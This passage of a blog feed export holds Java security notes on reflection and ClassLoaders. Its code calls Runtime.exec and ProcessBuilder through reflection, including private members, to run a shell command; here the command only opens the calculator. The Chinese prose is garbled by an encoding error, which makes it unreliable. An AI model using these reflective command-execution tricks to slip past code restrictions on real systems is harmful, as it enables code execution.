operator">+</span> <span class="token string">", My Age is "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        student<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//åå°„è°ƒç”¨Student</span>        <span class="token class-name">String</span> class_name <span class="token operator">=</span> <span class="token string">"student.Student"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> func <span class="token operator">=</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> stu_class <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> stu2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span> stu_class<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>stu2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>getDeclaredMethod()</code>: Returns a Method object that reflects the specified declared method of the class or interface represented by this Class object.</li><li><code>getMethod()</code>:         returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.</li></ul><p><code>getDeclaredMethod()</code>å¯ä»¥è·å–ç±»é‡Œé¢ä»»ä½•æ–¹æ³•ï¼Œ<code>getMethod()</code>åªå¯ä»¥è·å–<code>public</code>å±æ€§çš„æ–¹æ³•ã€‚å¦å¤–å‡ ä¸ªæ¯”è¾ƒç”¨çš„å¤šæ˜¯æ˜¯:</p><ul><li><code>getField(String name)</code>: æ ¹æ®å­—æ®µåè·å–å¯¹åº”çš„å­—æ®µï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œå¯ä»¥è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getFields()</code>: è·å–ç±»æ‰€æœ‰çš„å­—æ®µï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œå¯ä»¥è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getDeclaredField(String name)</code>: æ ¹æ®å­—æ®µåè·å–å¯¹åº”çš„å­—æ®µï¼Œå¯ä»¥è·å–publicã€protectedå’Œprivateç±»å‹çš„å­—æ®µï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getDeclaredFields()</code>: è·å–ç±»æ‰€æœ‰çš„å­—æ®µï¼ŒåŒ…æ‹¬publicã€protectedå’Œprivateã€‚ä¸èƒ½è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li></ul><h4 id="é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡"><a href="#é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡" class="headerlink" title="é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡"></a>é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡</h4><p><img src="/2022/03/22/java-reflection/7.png"></p><p><strong>å¦‚æœå­—æ®µæ˜¯staicä¿®é¥°çš„æ—¶å€™ï¼Œåœ¨è·å–å’Œä¿®æ”¹å­—æ®µçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨nullä»£æ›¿å…·ä½“å¯¹è±¡çš„stu</strong></p><h4 id="é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"><a href="#é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•" class="headerlink" title="é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"></a>é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•</h4><p><img src="/2022/03/22/java-reflection/8.png"></p><p>å¦‚æœè°ƒç”¨çš„æ–¹æ³•æœ‰å¤šä¸ªå‚æ•°ï¼Œéœ€è¦ä»¥æ•°ç»„çš„å½¢å¼ä¼ å…¥ï¼š<br><img src="/2022/03/22/java-reflection/9.png"></p><ul><li>ä½¿ç”¨<code>getDeclaredMethod</code>è·å–å¤šä¸ªå‚æ•°çš„æ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºnew Class[]{}ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„ä¸­æ¯ä¸€ä¸ªå€¼å¯¹åº”å‚æ•°çš„classå¯¹è±¡ã€‚è¿™æ˜¯ä¸€ç§æ ‡å‡†çš„ä¼ å‚æ–¹å¼ï¼Œå»ºè®®å³ä½¿æ–¹æ³•æ²¡æœ‰å‚æ•°æˆ–è€…åªæœ‰ä¸€ä¸ªå‚æ•°ä¹ŸæŒ‰ç…§è¿™ç§æ–¹å¼ä¼ å‚</li><li>ä½¿ç”¨<code>method.invoke</code>æ–¹æ³•å¯¹æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œä¼ é€’çš„ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå®é™…è°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°å€¼ï¼Œç±»å‹æ˜¯Objectæ•°ç»„ã€‚<br>å¯¹äºstaticç±»å‹çš„æ–¹æ³•ï¼Œä¸å­—æ®µçš„ä½¿ç”¨æ–¹æ³•ç›¸ä¼¼ï¼Œåœ¨æ‰§è¡Œæ–¹æ³•æ—¶ï¼ŒåŒæ ·å¯ä»¥æŠŠobjå¯¹è±¡æ¢æˆnull</li></ul><h4 id="åå°„è·å–æ„é€ å‡½æ•°"><a href="#åå°„è·å–æ„é€ å‡½æ•°" class="headerlink" title="åå°„è·å–æ„é€ å‡½æ•°"></a>åå°„è·å–æ„é€ å‡½æ•°</h4><p>æ„é€ å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦é€šè¿‡åå°„è·å–æ„é€ å‡½æ•°ï¼Œç„¶åé€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆç±»çš„å®ä¾‹ã€‚</p><ul><li><code>getConstructor(Class... parameterTypes)</code> æ ¹æ®å‚æ•°ç±»å‹è·å–å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½è·å–publicç±»å‹çš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getConstructors()</code> è·å–ç±»æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getDeclaredConstructor (Class... parameterTypes)</code> æ ¹æ®å‚æ•°ç±»å‹è·å–å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥è·å–publicã€protectedå’Œprivateç±»å‹çš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getDeclaredConstructors()</code> è·å–ç±»æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼ŒåŒ…æ‹¬publicã€protectedå’Œprivateã€‚ä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li></ul><p>åœ¨è·å–åˆ°æ„é€ å‡½æ•°ä¹‹åï¼Œéœ€è¦é€šè¿‡newInstanceå‡½æ•°æ¥ç”Ÿæˆç±»å¯¹è±¡ã€‚å…³äºnewInstanceçš„ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li><code>newInstance(Object ... initargs)</code>: newInstanceå‡½æ•°æ¥å—å¯å˜çš„å‚æ•°ä¸ªæ•°ï¼Œæ„é€ å‡½æ•°å®é™…æœ‰å‡ ä¸ªä¼ è¾“ï¼Œè¿™é‡Œå°±ä¼ é€’å‡ ä¸ªå‚æ•°å€¼ã€‚newInstanceè¿”å›çš„æ•°æ®ç±»å‹æ˜¯Objectï¼Œä¸€èˆ¬éœ€è¦å¼ºåˆ¶è½¬æ¢ç±»å‹ã€‚</li></ul><p><img src="/2022/03/22/java-reflection/10.png"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://javasec.org/javase/Reflection/Reflection.html">javasec.org</a></li><li><a href="https://www.freebuf.com/articles/web/308460.html">Javaä»£ç å®¡è®¡ä¹‹åå°„</a></li><li><a href="https://github.com/phith0n/JavaThings">Javaå®‰å…¨æ¼«è°ˆ</a></li><li><a href="https://xz.aliyun.com/t/9002">JAVAå®‰å…¨åŸºç¡€</a></li><li><a href="https://xz.aliyun.com/t/7029/">JAVAååºåˆ—åŒ– - åå°„æœºåˆ¶</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483830&idx=1&sn=39c08c61cbab36ace4ac691e0756948b&chksm=c2a1d53ff5d65c29f9b8310c324c67568fe27e61720baffff8af19ef9cb94f5096d73df0c69f">å‘Šåˆ«è„šæœ¬å°å­ç³»åˆ—ä¸¨JAVAå®‰å…¨(3)â€”â€”JAVAåå°„æœºåˆ¶</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-ç±»åŠ è½½å™¨-ClassLoader&quot;&gt;&lt;a href=&quot;#0x1-ç±»åŠ è½½å™¨-ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;0x1. ç±»åŠ è½½å™¨: ClassLoader&quot;&gt;&lt;/a&gt;0x1. ç±»åŠ è½½å™¨: ClassLoader&lt;/h2&gt;&lt;p&gt;Javaæ˜¯ä¸€ä¸ªä¾èµ–äº&lt;code&gt;JVMï¼ˆJavaè™šæ‹Ÿæœº)&lt;/code&gt;å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ï¼Œ&lt;code&gt;Java&lt;/code&gt;ä¼šå…ˆé€šè¿‡ç¼–è¯‘å™¨å°†æºä»£ç è½¬æ¢ä¸ºJavaäºŒè¿›åˆ¶å­—èŠ‚ç ï¼Œä¸€èˆ¬æ˜¯ä¿å­˜åœ¨&lt;code&gt;.class&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œä¹‹åé€šè¿‡&lt;code&gt;JVM&lt;/code&gt;è§£é‡Šå™¨æ‰§è¡Œè¿™æ®µä»£ç ã€‚å­—èŠ‚ç æ–‡ä»¶ä¼šåŒ…å«å¾ˆå¤šClassä¿¡æ¯ï¼Œåœ¨JVMè§£é‡Šå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ&lt;code&gt;ClassLoader&lt;/code&gt;å°±æ˜¯ç”¨æ¥åŠ è½½ç±»çš„ï¼Œå®ƒä¼šå°†Javaå­—èŠ‚ç ä¸­çš„ClassåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œæ¯ä¸ª&lt;code&gt;Class&lt;/code&gt;å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ª&lt;code&gt;ClassLoader&lt;/code&gt;å±æ€§æ ‡è¯†ç”±å“ªä¸ª&lt;code&gt;ClassLoader&lt;/code&gt;åŠ è½½ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å¸¸è§çš„ClassLoader&quot;&gt;&lt;a href=&quot;#å¸¸è§çš„ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;å¸¸è§çš„ClassLoader&quot;&gt;&lt;/a&gt;å¸¸è§çš„ClassLoader&lt;/h3&gt;&lt;p&gt;ä¸€åˆ‡çš„&lt;code&gt;Java&lt;/code&gt;ç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½ä¹‹åæ‰å¯ä»¥è¿è¡Œï¼Œæœ€å¸¸è§çš„&lt;code&gt;ClassLoader&lt;/code&gt;ï¼š &lt;code&gt;BootstrapClassLoader&lt;/code&gt;ã€&lt;code&gt;ExtensionClassLoader&lt;/code&gt;ã€&lt;code&gt;AppClassLoader&lt;/code&gt;ã€&lt;code&gt;URLClassLoader&lt;/code&gt;ã€&lt;code&gt;ContextClassLoader&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;BootstrapClassLoader&quot;&gt;&lt;a href=&quot;#BootstrapClassLoader&quot; class=&quot;headerlink&quot; title=&quot;BootstrapClassLoader&quot;&gt;&lt;/a&gt;BootstrapClassLoader&lt;/h4&gt;&lt;p&gt;JVMå†…ç½®çš„é»˜è®¤&lt;code&gt;classLoader&lt;/code&gt;,è´Ÿè´£åŠ è½½JVMè¿è¡Œæ—¶çš„æ ¸å¿ƒç±»ï¼Œä½äº&lt;code&gt;JAVA_HOME/lib/rt.jar/&lt;/code&gt;æ–‡ä»¶å¤¹ä¸­ï¼Œç”±Cä»£ç å®ç°ï¼Œ&lt;code&gt;Bootstrap ClassLoader&lt;/code&gt;ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›null&lt;/p&gt;
&lt;h4 id=&quot;ExtClassLoader&quot;&gt;&lt;a href=&quot;#ExtClassLoader&quot; class=&quot;headerlink&quot; title=&quot;ExtClassLoader&quot;&gt;&lt;/a&gt;ExtClassLoader&lt;/h4&gt;&lt;p&gt;æ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº &lt;code&gt;JAVA_HOME/lib/ext/*.jar&lt;/code&gt; ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´&lt;/p&gt;
&lt;h4 id=&quot;AppClassLoader&quot;&gt;&lt;a href=&quot;#AppClassLoader&quot; class=&quot;headerlink&quot; title=&quot;AppClassLoader&quot;&gt;&lt;/a&gt;AppClassLoader&lt;/h4&gt;&lt;p&gt;åº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½&lt;code&gt;ClASSPATH&lt;/code&gt;ç¯å¢ƒå˜é‡æˆ–è€…&lt;code&gt;java.class.path&lt;/code&gt;å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„jaråŒ…å’Œç›®å½•ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™å’Œä½¿ç”¨çš„ç¬¬ä¸‰æ–¹JaråŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(2)-åå°„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection-shell.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection-shell.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:37:43.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>Runtimeä¸­å¯ä»¥è·å–åˆ°<code>Runtime</code>å®ä¾‹æœ‰ä¸‰ç§æ–¹æ³•:</p><ol><li><code>private static Runtime currentRuntime = new Runtime();</code></li><li><code>public static Runtime getRuntime()</code></li><li><code>private Runtime() &#123;&#125;</code></li></ol><p><img src="/2022/03/22/java-reflection-shell/2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectRuntime</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//åˆ©ç”¨ç§æœ‰å˜é‡ç”Ÿæˆå®ä¾‹ private static Runtime currentRuntime = new Runtime();</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"currentRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//åˆ©ç”¨     public static Runtime getRuntime() &#123;</span>        <span class="token comment">//        return currentRuntime;</span>        <span class="token comment">//    &#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">// åˆ©ç”¨æ„é€ å‡½æ•° private Runtime() &#123;&#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><p>ä½¿ç”¨<code>constructor</code>åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œæ‰€ä»¥éœ€è¦<code>new Object[]</code>å¼ºåˆ¶è½¬æ¢: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessBuilder</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token 